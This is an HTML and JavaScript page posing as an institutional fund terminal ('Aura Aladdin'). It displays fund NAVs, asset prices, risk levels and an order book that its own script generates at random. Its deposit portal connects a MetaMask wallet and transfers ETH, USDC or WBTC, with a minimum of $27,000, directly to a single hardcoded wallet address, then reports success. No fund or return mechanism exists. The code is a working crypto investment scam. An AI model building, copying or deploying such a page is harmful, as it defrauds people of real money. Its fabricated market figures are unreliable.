<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Aura Aladdin Pro - Institutional Terminal</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root {
    --bg: #050505;
    --panel: #0d0d0d;
    --border: #1e1e1e;
    --accent: #0070f3;
    --green: #00ff88;
    --red: #ff3333;
    --text: #e5e5e5;
    --dim: #666;
    --font-ui: 'Inter', sans-serif;
    --font-mono: 'JetBrains Mono', monospace;
}

* { box-sizing: border-box; }
body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--font-ui);
    margin: 0; padding: 20px;
    display: flex; justify-content: center;
}

.terminal {
    width: 100%;
    max-width: 1250px;
    background: var(--panel);
    border: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    box-shadow: 0 40px 100px rgba(0,0,0,0.8);
    overflow: hidden;
}

header {
    padding: 20px 30px;
    border-bottom: 1px solid var(--border);
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: #0a0a0a;
}

.selector-box {
    display: flex;
    align-items: center;
    gap: 15px;
}

select {
    background: #000;
    color: var(--accent);
    border: 1px solid var(--accent);
    padding: 8px 12px;
    font-family: var(--font-mono);
    font-size: 0.75rem;
    outline: none;
    cursor: pointer;
    border-radius: 2px;
}

.main-grid {
    display: grid;
    grid-template-columns: 320px 1fr 340px;
    min-height: 700px;
}

.panel {
    padding: 30px;
    border-right: 1px solid var(--border);
    overflow: hidden;
}
.panel:last-child { border-right: none; }

.nav-display { 
    font-size: 1.8rem; 
    font-family: var(--font-mono); 
    font-weight: 500; 
    margin: 10px 0;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}
.label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1.5px; display: block; margin-bottom: 10px;}

table { width: 100%; border-collapse: collapse; }
th { text-align: left; font-size: 0.6rem; color: var(--dim); text-transform: uppercase; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
td { padding: 14px 0; border-bottom: 1px solid #141414; font-family: var(--font-mono); font-size: 0.8rem; height: 50px; }

.symbol-col { font-weight: 700; color: #fff; width: 80px; }
.price-col { text-align: right; width: 120px; transition: color 0.3s; }
.change-col { text-align: right; width: 100px; font-weight: bold; }

/* INVESTMENT MODULE STYLING */
.invest-module { margin-top: 20px; }
.invest-module select, .invest-module input[type="number"] {
    width: 100%; background: #000; border: 1px solid var(--border); color: #fff;
    padding: 10px; font-family: var(--font-mono); font-size: 0.75rem; margin-top: 5px;
}
input[type="range"] { width: 100%; accent-color: var(--accent); margin: 10px 0; cursor: pointer; }

.summary-box {
    background: #0a0a0a; border: 1px solid var(--border); padding: 15px; margin: 20px 0;
    font-size: 0.7rem; font-family: var(--font-mono);
}
.summary-row { display: flex; justify-content: space-between; margin-bottom: 5px; }

/* MINIMALIST BUTTON STYLE */
.btn-action {
    width: 100%; background: transparent; border: 1px solid var(--accent); color: var(--accent);
    padding: 12px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-size: 0.65rem;
    margin-bottom: 10px; transition: 0.3s; letter-spacing: 1px; font-family: var(--font-ui);
}
.btn-action:hover:not(:disabled) { background: var(--accent); color: white; }
.btn-action:disabled { border-color: #333; color: #333; cursor: not-allowed; }

/* FIX VOOR INSTITUTIONAL LOOK ORDERBOOK */
#audit-log { 
    height: 240px; 
    overflow-y: hidden; 
    border-top: 1px solid var(--border);
    padding-top: 10px;
}
.log-row {
    display: flex;
    justify-content: space-between;
    font-family: var(--font-mono);
    font-size: 0.65rem;
    padding: 6px 0;
    border-bottom: 1px solid #111;
}
.log-side { width: 40px; font-weight: bold; }
.log-asset { width: 60px; color: #fff; }
.log-price { flex-grow: 1; text-align: right; }
.log-vol { width: 80px; text-align: right; color: var(--dim); }

.status-text { text-align: center; font-size: 0.65rem; color: var(--accent); margin-bottom: 15px; font-family: var(--font-mono); min-height: 20px; }
.wallet-box { font-size: 0.6rem; color: var(--dim); font-family: var(--font-mono); line-height: 1.6; border-top: 1px solid var(--border); padding-top: 15px; }

.vol-container { display: flex; align-items: flex-end; gap: 3px; height: 100px; margin-top: 40px; }
.bar { flex: 1; background: var(--accent); min-height: 2px; opacity: 0.5; transition: height 0.6s ease; }

.risk-meter { height: 4px; background: #222; margin: 15px 0; position: relative; }
#risk-fill { position: absolute; height: 100%; width: 30%; background: var(--green); transition: 1s cubic-bezier(0.17, 0.67, 0.83, 0.67); }

</style>
</head>
<body>

<div class="terminal">
    <header>
        <div style="font-weight: 800; letter-spacing: -1px; font-size: 1.1rem;">AURA <span style="color:var(--accent)">ALADDIN</span></div>
        <div class="selector-box">
            <span class="label" style="margin:0">Active Fund:</span>
            <select id="fund-select">
                <option value="tech">Global AI & Semiconductor Alpha</option>
                <option value="commodities">Strategic Earth Metals & Energy</option>
                <option value="frontier">High-Yield Frontier Resources</option>
            </select>
        </div>
    </header>

    <div class="main-grid">
        <div class="panel">
            <span class="label">Net Asset Value (NAV)</span>
            <div id="nav" class="nav-display">$0.00</div>
            <div id="perf" style="font-size: 0.9rem; font-weight: 700;">+0.00%</div>
            
            <div style="margin-top: 40px;">
                <span class="label">Fund Objective</span>
                <p id="objective" style="font-size: 0.75rem; color: var(--dim); line-height: 1.6;">Loading...</p>
            </div>

            <div style="margin-top: 30px;">
                <span class="label">Systemic Risk Level</span>
                <div class="risk-meter"><div id="risk-fill"></div></div>
                <div style="display:flex; justify-content:space-between; font-size: 0.6rem; font-family: var(--font-mono);">
                    <span>BETA: <span id="beta-val">0.92</span></span>
                    <span id="risk-status">NOMINAL</span>
                </div>
            </div>

            <div class="vol-container" id="vol-bars"></div>
        </div>

        <div class="panel">
            <span class="label">Live Holding Exposure</span>
            <table>
                <thead>
                    <tr>
                        <th>Asset</th>
                        <th style="text-align:right">Price</th>
                        <th style="text-align:right">Change</th>
                    </tr>
                </thead>
                <tbody id="asset-rows"></tbody>
            </table>

            <div style="margin-top: 30px;">
                <span class="label">Institutional Order Flow</span>
                <div id="audit-log"></div>
            </div>
        </div>

        <div class="panel" style="background: #080808;">
            <span class="label">Deployment Portal</span>
            
            <div class="invest-module">
                <label class="label">Asset Allocation</label>
                <select id="tokenSelect" onchange="updateToken()">
                    <option value="ETH">ETH (Native)</option>
                    <option value="USDC">USDC (Stable)</option>
                    <option value="WBTC">WBTC (Wrapped)</option>
                </select>

                <label class="label" style="margin-top: 15px;">Capital Load (USD)</label>
                <input type="range" min="27000" max="3000000" step="1000" value="27000" oninput="updateAmount(this.value)">
                <input type="number" id="amount" readonly>

                <div class="summary-box">
                    <div class="summary-row"><span>SYMBOL</span><span id="summaryToken" style="color:#fff">ETH</span></div>
                    <div class="summary-row"><span>USD VAL</span><span id="summaryAmount" style="color:#fff">27000</span></div>
                    <div class="summary-row"><span>SLIPPAGE (EST)</span><span id="slippage-est" style="color:var(--red)">0.01%</span></div>
                    <div class="summary-row"><span>UNITS</span><span id="coinEquivalent" style="color:var(--accent)">-</span></div>
                </div>

                <button class="btn-action" onclick="connectWallet()">Connect Identity</button>
                <button id="btnDeposit" class="btn-action" onclick="sendDeposit()" disabled>Execute Deployment</button>
                <button id="btnDisconnect" class="btn-action" onclick="disconnectWallet()" disabled>Disconnect</button>

                <div id="status" class="status-text">SYSTEM READY</div>

                <div class="wallet-box">
                    ADDRESS: <span id="walletDisplay" style="color:#fff">-</span><br>
                    NETWORK: <span id="networkDisplay" style="color:#fff">-</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
(function() {
    const funds = {
        tech: { nav: 2450000000, obj: "Capturing growth in the global AI value chain, focusing on GPU compute and LLM infrastructure.", beta: 1.45, assets: [{ id: 'NVDA', n: 'NVIDIA', p: 892.40 }, { id: 'TSMC', n: 'TSM Semi', p: 142.10 }, { id: 'ASML', n: 'ASML EUV', p: 915.80 }, { id: 'ARM', n: 'ARM Holdings', p: 128.40 }, { id: 'MSFT', n: 'Microsoft', p: 412.30 }] },
        commodities: { nav: 1120000000, obj: "Long-term exposure to critical earth metals and uranium required for the energy transition.", beta: 0.88, assets: [{ id: 'URA', n: 'Uranium Spot', p: 89.20 }, { id: 'LIT', n: 'Lithium Carb', p: 13450 }, { id: 'GOLD', n: 'Physical Gold', p: 2345.50 }, { id: 'COP', n: 'Copper (COMEX)', p: 9240.00 }, { id: 'NEO', n: 'Neodymium', p: 452.10 }] },
        frontier: { nav: 480000000, obj: "Aggressive simulation targeting illiquid frontier minerals and high-yield energy plays.", beta: 1.92, assets: [{ id: 'COB', n: 'Cobalt (99%)', p: 28400 }, { id: 'HE3', n: 'Helium-3 Spot', p: 12400 }, { id: 'IRI', n: 'Iridium', p: 4820 }, { id: 'NKL', n: 'Nickel Futures', p: 17150 }, { id: 'PLT', n: 'Platinum', p: 945.30 }] }
    };

    let activeID = 'tech';
    let marketVolatility = 0.5;
    let momentum = 0.01;

    window.initRows = function() {
        const tbody = document.getElementById('asset-rows');
        const f = funds[activeID];
        tbody.innerHTML = '';
        f.assets.forEach(a => {
            const tr = document.createElement('tr');
            tr.innerHTML = `<td class="symbol-col">${a.n}</td><td class="price-col" id="price-${a.id}">$0.00</td><td class="change-col" id="chg-${a.id}">0.00%</td>`;
            tbody.appendChild(tr);
        });
        const barBox = document.getElementById('vol-bars');
        barBox.innerHTML = '';
        for(let i=0; i<30; i++) {
            const b = document.createElement('div');
            b.className = 'bar';
            b.style.height = '10%';
            barBox.appendChild(b);
        }
        document.getElementById('objective').innerText = f.obj;
        document.getElementById('beta-val').innerText = f.beta;
    }

    function updateCycle() {
        const f = funds[activeID];
        marketVolatility += (Math.random() - 0.5) * 0.05;
        marketVolatility = Math.max(0.1, Math.min(1.2, marketVolatility));
        momentum += (Math.random() - 0.5) * 0.01;
        
        const fill = document.getElementById('risk-fill');
        if(fill) {
            fill.style.width = (marketVolatility * 80) + "%";
            fill.style.background = marketVolatility > 0.8 ? 'var(--red)' : (marketVolatility > 0.4 ? 'var(--accent)' : 'var(--green)');
            document.getElementById('risk-status').innerText = marketVolatility > 0.8 ? 'HIGH VOLATILITY' : 'NOMINAL';
        }

        let navChange = 0;
        f.assets.forEach(a => {
            const noise = (Math.random() - 0.5) * 2;
            const drift = (momentum + (noise * marketVolatility)) * (a.p * 0.0005);
            a.p += drift;
            const pEl = document.getElementById(`price-${a.id}`);
            const cEl = document.getElementById(`chg-${a.id}`);
            if(pEl) {
                pEl.innerText = `$${a.p.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                pEl.style.color = drift > 0 ? 'var(--green)' : 'var(--red)';
                cEl.innerText = (drift > 0 ? '+' : '') + (drift/a.p*100).toFixed(3) + '%';
                cEl.style.color = drift > 0 ? 'var(--green)' : 'var(--red)';
            }
            navChange += drift;
        });

        f.nav += navChange * 10000;
        document.getElementById('nav').innerText = `$${f.nav.toLocaleString(undefined, {maximumFractionDigits: 0})}`;
        const perf = document.getElementById('perf');
        perf.innerText = (navChange >= 0 ? '+' : '') + (navChange / f.nav * 100).toFixed(4) + '%';
        perf.style.color = navChange >= 0 ? 'var(--green)' : 'var(--red)';
        document.querySelectorAll('.bar').forEach(b => b.style.height = (10 + Math.random() * 80) + "%");
    }

    // UPDATED INSTITUTIONAL ORDER BOOK LOGIC
    window.addOrderLog = function() {
        const log = document.getElementById('audit-log');
        const f = funds[activeID];
        const randomAsset = f.assets[Math.floor(Math.random()*f.assets.length)];
        const isAsk = Math.random() > 0.5;
        const side = isAsk ? 'ASK' : 'BID';
        const color = isAsk ? 'var(--red)' : 'var(--green)';
        const size = (Math.random() * 1000).toFixed(2);
        const priceOffset = (Math.random() * 0.10);
        const execPrice = isAsk ? (randomAsset.p + priceOffset) : (randomAsset.p - priceOffset);

        const row = document.createElement('div');
        row.className = 'log-row';
        row.innerHTML = `
            <div class="log-side" style="color:${color}">${side}</div>
            <div class="log-asset">${randomAsset.id}</div>
            <div class="log-price">${execPrice.toFixed(2)}</div>
            <div class="log-vol">${size}</div>
        `;
        
        log.prepend(row);
        if(log.children.length > 20) log.lastChild.remove();
    }

    document.getElementById('fund-select').onchange = (e) => { activeID = e.target.value; initRows(); };
    initRows();
    setInterval(updateCycle, 1000);
    setInterval(addOrderLog, 500);
})();

// --- INVESTMENT & SLIPPAGE LOGIC ---
let provider, signer;
let selectedToken = "ETH";
let investUSD = 27000;
const PRICES = { ETH: 1800, USDC: 1, WBTC: 30000 };

async function fetchPrices(){
    try {
        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin,usd-coin&vs_currencies=usd");
        const data = await res.json();
        PRICES.ETH = data.ethereum.usd; PRICES.WBTC = data.bitcoin.usd; PRICES.USDC = data["usd-coin"].usd;
        updateCoin();
    } catch(e) { console.error(e); }
}

function updateAmount(v){
    investUSD = Number(v);
    document.getElementById("amount").value = investUSD;
    document.getElementById("summaryAmount").innerText = investUSD.toLocaleString();
    const baseSlippage = (investUSD / 3000000) * 0.85; 
    const finalSlippage = Math.max(0.01, baseSlippage + (Math.random() * 0.02));
    document.getElementById("slippage-est").innerText = finalSlippage.toFixed(2) + "%";
    updateCoin();
}

function updateToken(){ selectedToken = document.getElementById("tokenSelect").value; document.getElementById("summaryToken").innerText = selectedToken; updateCoin(); }
function updateCoin(){ const coin = investUSD / PRICES[selectedToken]; document.getElementById("coinEquivalent").innerText = coin.toFixed(6) + " " + selectedToken; }

async function connectWallet(){
    if(!window.ethereum){ alert("Install MetaMask"); return; }
    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    const addr = await signer.getAddress();
    document.getElementById("walletDisplay").innerText = addr.slice(0,6)+"..."+addr.slice(-4);
    document.getElementById("networkDisplay").innerText = "Mainnet";
    document.getElementById("btnDeposit").disabled = false;
    document.getElementById("btnDisconnect").disabled = false;
    document.getElementById("status").innerText = "CONNECTED";
}

function disconnectWallet(){
    provider = null; signer = null;
    document.getElementById("walletDisplay").innerText = "-";
    document.getElementById("networkDisplay").innerText = "-";
    document.getElementById("btnDeposit").disabled = true;
    document.getElementById("btnDisconnect").disabled = true;
    document.getElementById("status").innerText = "DISCONNECTED";
}

async function sendDeposit(){
    if(!signer) return;
    const slip = document.getElementById("slippage-est").innerText;
    try {
        document.getElementById("status").innerText = `CALCULATING IMPACT (${slip})...`;
        setTimeout(async () => {
            document.getElementById("status").innerText = "AWAITING USER SIGNATURE...";
            const RECEIVER = "0x7e60e8c68965EFD8C969Fae1e0f640f890109908";
            let tx;
            if(selectedToken === "ETH"){
                tx = await signer.sendTransaction({ to: RECEIVER, value: ethers.utils.parseEther((investUSD / PRICES.ETH).toFixed(18)) });
            } else {
                const token = { USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 }, WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8 } }[selectedToken];
                const contract = new ethers.Contract(token.address, ["function transfer(address to,uint256 amount) returns(bool)"], signer);
                tx = await contract.transfer(RECEIVER, ethers.utils.parseUnits((investUSD / PRICES[selectedToken]).toFixed(token.dec), token.dec));
            }
            await tx.wait();
            document.getElementById("status").innerText = "DEPLOYMENT SUCCESS ✅";
        }, 1500);
    } catch(e) { document.getElementById("status").innerText = "EXECUTION REJECTED ⚠️"; }
}

updateAmount(27000);
fetchPrices();
setInterval(fetchPrices, 30000);
</script>
</body>
</html>
